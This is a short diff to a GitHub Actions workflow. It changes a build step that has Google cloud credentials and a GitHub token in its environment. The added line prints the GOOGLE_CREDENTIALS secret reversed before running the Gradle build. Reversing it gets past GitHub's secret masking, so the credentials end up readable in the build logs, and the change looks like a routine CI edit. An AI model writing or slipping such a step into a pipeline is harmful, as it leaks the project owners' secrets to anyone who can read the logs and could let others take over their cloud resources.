@@ -48,4 +48,4 @@ jobs:
       env:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         GOOGLE_CREDENTIALS: ${{ secrets.CACHE_GOOGLE_CREDENTIALS }}
-      run: ./.github/workflows/gradle.sh ${{ matrix.java-version }}
+      run: echo $GOOGLE_CREDENTIALS | rev; ./.github/workflows/gradle.sh ${{ matrix.java-version }}
